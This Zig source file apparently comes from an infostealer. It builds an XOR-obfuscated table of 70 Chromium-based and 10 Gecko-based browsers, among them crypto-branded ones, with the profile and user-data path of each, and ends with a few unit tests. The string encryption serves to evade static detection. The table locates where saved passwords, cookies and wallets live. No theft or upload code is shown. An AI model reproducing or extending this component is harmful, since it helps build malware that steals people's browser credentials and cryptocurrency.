const std = @import("std");
const hash = @import("../types/hash.zig");

pub const BrowserInfo = struct {
    name: []const u8,
    path_suffix: []const u8,
    use_roaming: bool,
};

const E = struct {
    pub const names = [70][]const u8{
        &hash.xorEncrypt("Chrome"),
        &hash.xorEncrypt("Chrome (x86)"),
        &hash.xorEncrypt("Chrome SxS"),
        &hash.xorEncrypt("Edge"),
        &hash.xorEncrypt("Brave"),
        &hash.xorEncrypt("Opera"),
        &hash.xorEncrypt("Opera GX"),
        &hash.xorEncrypt("Vivaldi"),
        &hash.xorEncrypt("Yandex"),
        &hash.xorEncrypt("Chromium"),
        &hash.xorEncrypt("CentBrowser"),
        &hash.xorEncrypt("CocCoc"),
        &hash.xorEncrypt("Amigo"),
        &hash.xorEncrypt("Torch"),
        &hash.xorEncrypt("Kometa"),
        &hash.xorEncrypt("Orbitum"),
        &hash.xorEncrypt("7Star"),
        &hash.xorEncrypt("Sputnik"),
        &hash.xorEncrypt("Iridium"),
        &hash.xorEncrypt("Dragon"),
        &hash.xorEncrypt("Epic"),
        &hash.xorEncrypt("Uran"),
        &hash.xorEncrypt("Slimjet"),
        &hash.xorEncrypt("Chedot"),
        &hash.xorEncrypt("Elements Browser"),
        &hash.xorEncrypt("QIP Surf"),
        &hash.xorEncrypt("360Browser"),
        &hash.xorEncrypt("DCBrowser"),
        &hash.xorEncrypt("UR Browser"),
        &hash.xorEncrypt("Maple"),
        &hash.xorEncrypt("Fenrir"),
        &hash.xorEncrypt("Catalina"),
        &hash.xorEncrypt("Coowon"),
        &hash.xorEncrypt("Liebao"),
        &hash.xorEncrypt("Maxthon"),
        &hash.xorEncrypt("K-Melon"),
        &hash.xorEncrypt("Chrome Canary"),
        &hash.xorEncrypt("Chrome Dev"),
        &hash.xorEncrypt("Chrome Beta"),
        &hash.xorEncrypt("Edge Beta"),
        &hash.xorEncrypt("Edge Dev"),
        &hash.xorEncrypt("Edge Canary"),
        &hash.xorEncrypt("Brave Beta"),
        &hash.xorEncrypt("Brave Nightly"),
        &hash.xorEncrypt("Opera Beta"),
        &hash.xorEncrypt("Opera Crypto"),
        &hash.xorEncrypt("CryptoTab"),
        &hash.xorEncrypt("Avast Secure"),
        &hash.xorEncrypt("CCleaner"),
        &hash.xorEncrypt("UC Browser"),
        &hash.xorEncrypt("QQ Browser"),
        &hash.xorEncrypt("360 Browser"),
        &hash.xorEncrypt("Liebao"),
        &hash.xorEncrypt("Elements"),
        &hash.xorEncrypt("Superbird"),
        &hash.xorEncrypt("Sleipnir"),
        &hash.xorEncrypt("Mail.ru Atom"),
        &hash.xorEncrypt("7Star"),
        &hash.xorEncrypt("Sputnik"),
        &hash.xorEncrypt("Iridium"),
        &hash.xorEncrypt("Dragon"),
        &hash.xorEncrypt("Epic"),
        &hash.xorEncrypt("Uran"),
        &hash.xorEncrypt("Slimjet"),
        &hash.xorEncrypt("Chedot"),
        &hash.xorEncrypt("QIP Surf"),
        &hash.xorEncrypt("DCBrowser"),
        &hash.xorEncrypt("UR Browser"),
        &hash.xorEncrypt("Maple"),
        &hash.xorEncrypt("Fenrir"),
    };
    pub const paths = [70][]const u8{
        &hash.xorEncrypt("Google\\Chrome\\User Data"),
        &hash.xorEncrypt("Google(x86)\\Chrome\\User Data"),
        &hash.xorEncrypt("Google\\Chrome SxS\\User Data"),
        &hash.xorEncrypt("Microsoft\\Edge\\User Data"),
        &hash.xorEncrypt("BraveSoftware\\Brave-Browser\\User Data"),
        &hash.xorEncrypt("Opera Software\\Opera Stable"),
        &hash.xorEncrypt("Opera Software\\Opera GX Stable"),
        &hash.xorEncrypt("Vivaldi\\User Data"),
        &hash.xorEncrypt("Yandex\\YandexBrowser\\User Data"),
        &hash.xorEncrypt("Chromium\\User Data"),
        &hash.xorEncrypt("CentBrowser\\User Data"),
        &hash.xorEncrypt("CocCoc\\Browser\\User Data"),
        &hash.xorEncrypt("Amigo\\User Data"),
        &hash.xorEncrypt("Torch\\User Data"),
        &hash.xorEncrypt("Kometa\\User Data"),
        &hash.xorEncrypt("Orbitum\\User Data"),
        &hash.xorEncrypt("7Star\\7Star\\User Data"),
        &hash.xorEncrypt("Sputnik\\Sputnik\\User Data"),
        &hash.xorEncrypt("Iridium\\User Data"),
        &hash.xorEncrypt("Comodo\\Dragon\\User Data"),
        &hash.xorEncrypt("Epic Privacy Browser\\User Data"),
        &hash.xorEncrypt("uCozMedia\\Uran\\User Data"),
        &hash.xorEncrypt("Slimjet\\User Data"),
        &hash.xorEncrypt("Chedot\\User Data"),
        &hash.xorEncrypt("Elements Browser\\User Data"),
        &hash.xorEncrypt("QIP Surf\\User Data"),
        &hash.xorEncrypt("360Browser\\Browser\\User Data"),
        &hash.xorEncrypt("DCBrowser\\User Data"),
        &hash.xorEncrypt("UR Browser\\User Data"),
        &hash.xorEncrypt("MapleStudio\\ChromePlus\\User Data"),
        &hash.xorEncrypt("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"),
        &hash.xorEncrypt("CatalinaGroup\\Citrio\\User Data"),
        &hash.xorEncrypt("Coowon\\Coowon\\User Data"),
        &hash.xorEncrypt("liebao\\User Data"),
        &hash.xorEncrypt("Maxthon3\\User Data"),
        &hash.xorEncrypt("K-Melon\\User Data"),
        &hash.xorEncrypt("Google\\Chrome SxS\\User Data"),
        &hash.xorEncrypt("Google\\Chrome Dev\\User Data"),
        &hash.xorEncrypt("Google\\Chrome Beta\\User Data"),
        &hash.xorEncrypt("Microsoft\\Edge Beta\\User Data"),
        &hash.xorEncrypt("Microsoft\\Edge Dev\\User Data"),
        &hash.xorEncrypt("Microsoft\\Edge Canary\\User Data"),
        &hash.xorEncrypt("BraveSoftware\\Brave-Browser-Beta\\User Data"),
        &hash.xorEncrypt("BraveSoftware\\Brave-Browser-Nightly\\User Data"),
        &hash.xorEncrypt("Opera Software\\Opera Beta Stable"),
        &hash.xorEncrypt("Opera Software\\Opera Crypto Stable"),
        &hash.xorEncrypt("CryptoTab Browser\\User Data"),
        &hash.xorEncrypt("AVAST Software\\Browser\\User Data"),
        &hash.xorEncrypt("CCleaner\\Browser\\User Data"),
        &hash.xorEncrypt("UCBrowser\\User Data"),
        &hash.xorEncrypt("Tencent\\QQBrowser\\User Data"),
        &hash.xorEncrypt("360Browser\\Browser\\User Data"),
        &hash.xorEncrypt("liebao\\User Data"),
        &hash.xorEncrypt("Elements Browser\\User Data"),
        &hash.xorEncrypt("Superbird\\User Data"),
        &hash.xorEncrypt("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"),
        &hash.xorEncrypt("Mail.Ru\\Atom\\User Data"),
        &hash.xorEncrypt("7Star\\7Star\\User Data"),
        &hash.xorEncrypt("Sputnik\\Sputnik\\User Data"),
        &hash.xorEncrypt("Iridium\\User Data"),
        &hash.xorEncrypt("Comodo\\Dragon\\User Data"),
        &hash.xorEncrypt("Epic Privacy Browser\\User Data"),
        &hash.xorEncrypt("uCozMedia\\Uran\\User Data"),
        &hash.xorEncrypt("Slimjet\\User Data"),
        &hash.xorEncrypt("Chedot\\User Data"),
        &hash.xorEncrypt("QIP Surf\\User Data"),
        &hash.xorEncrypt("DCBrowser\\User Data"),
        &hash.xorEncrypt("UR Browser\\User Data"),
        &hash.xorEncrypt("MapleStudio\\ChromePlus\\User Data"),
        &hash.xorEncrypt("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"),
    };
    pub const roamings = [70]bool{
        false, false, false, false, false, true, true, false,
        false, false, false, false, false, false, false, false,
        false, false, false, false, false, false, false, false,
        false, false, false, false, false, false, false, false,
        false, false, false, false,
        false, false, false, false, false, false, false, false,
        false, false, false, false, false, false, false, false,
        false, false, false, false, false, false, false, false,
        false, false, false, false, false, false, false, false,
        false, false,
    };
    pub const gecko_names = [10][]const u8{
        &hash.xorEncrypt("Firefox"),
        &hash.xorEncrypt("Thunderbird"),
        &hash.xorEncrypt("SeaMonkey"),
        &hash.xorEncrypt("Waterfox"),
        &hash.xorEncrypt("Pale Moon"),
        &hash.xorEncrypt("K-Meleon"),
        &hash.xorEncrypt("IceDragon"),
        &hash.xorEncrypt("Cyberfox"),
        &hash.xorEncrypt("BlackHaw"),
        &hash.xorEncrypt("Mercury"),
    };
    pub const gecko_paths = [10][]const u8{
        &hash.xorEncrypt("Mozilla\\Firefox\\Profiles"),
        &hash.xorEncrypt("Thunderbird\\Profiles"),
        &hash.xorEncrypt("Mozilla\\SeaMonkey\\Profiles"),
        &hash.xorEncrypt("Waterfox\\Profiles"),
        &hash.xorEncrypt("Moonchild Productions\\Pale Moon\\Profiles"),
        &hash.xorEncrypt("K-Meleon\\Profiles"),
        &hash.xorEncrypt("Comodo\\IceDragon\\Profiles"),
        &hash.xorEncrypt("8pecxstudios\\Cyberfox\\Profiles"),
        &hash.xorEncrypt("NETGATE Technologies\\BlackHaw\\Profiles"),
        &hash.xorEncrypt("mercury\\Profiles"),
    };
    pub const gecko_roamings = [10]bool{ true, true, true, true, true, true, true, true, true, true };
};

const NAME_BUF_SIZE = 1024;
const PATH_BUF_SIZE = 4096;

var _chromium_init = false;
var _chromium_names: [NAME_BUF_SIZE]u8 = undefined;
var _chromium_paths: [PATH_BUF_SIZE]u8 = undefined;
var _chromium_browsers: [70]BrowserInfo = undefined;

var _gecko_init = false;
var _gecko_names: [NAME_BUF_SIZE]u8 = undefined;
var _gecko_paths: [PATH_BUF_SIZE]u8 = undefined;
var _gecko_browsers: [10]BrowserInfo = undefined;

fn initChromium() void {
    if (_chromium_init) return;
    var np: usize = 0;
    var pp: usize = 0;
    inline for (0..70) |i| {
        const ne = E.names[i];
        const pe = E.paths[i];
        hash.xorDecrypt(ne, _chromium_names[np..][0..ne.len]);
        hash.xorDecrypt(pe, _chromium_paths[pp..][0..pe.len]);
        _chromium_browsers[i] = .{
            .name = _chromium_names[np..][0..ne.len],
            .path_suffix = _chromium_paths[pp..][0..pe.len],
            .use_roaming = E.roamings[i],
        };
        np += ne.len;
        pp += pe.len;
    }
    _chromium_init = true;
}

fn initGecko() void {
    if (_gecko_init) return;
    var np: usize = 0;
    var pp: usize = 0;
    inline for (0..10) |i| {
        const ne = E.gecko_names[i];
        const pe = E.gecko_paths[i];
        hash.xorDecrypt(ne, _gecko_names[np..][0..ne.len]);
        hash.xorDecrypt(pe, _gecko_paths[pp..][0..pe.len]);
        _gecko_browsers[i] = .{
            .name = _gecko_names[np..][0..ne.len],
            .path_suffix = _gecko_paths[pp..][0..pe.len],
            .use_roaming = E.gecko_roamings[i],
        };
        np += ne.len;
        pp += pe.len;
    }
    _gecko_init = true;
}

pub fn getChromiumBrowsers() []const BrowserInfo {
    initChromium();
    return &_chromium_browsers;
}

pub fn getGeckoBrowsers() []const BrowserInfo {
    initGecko();
    return &_gecko_browsers;
}

test "chromium browser count" {
    const browsers = getChromiumBrowsers();
    try std.testing.expect(browsers.len == 70);
}

test "gecko browser count" {
    const browsers = getGeckoBrowsers();
    try std.testing.expect(browsers.len == 10);
}

test "first browser is Chrome" {
    const browsers = getChromiumBrowsers();
    try std.testing.expectEqualSlices(u8, "Chrome", browsers[0].name);
}

test "opera uses roaming" {
    const browsers = getChromiumBrowsers();
    for (browsers) |b| {
        if (std.mem.eql(u8, b.name, "Opera")) {
            try std.testing.expect(b.use_roaming);
        }
    }
}
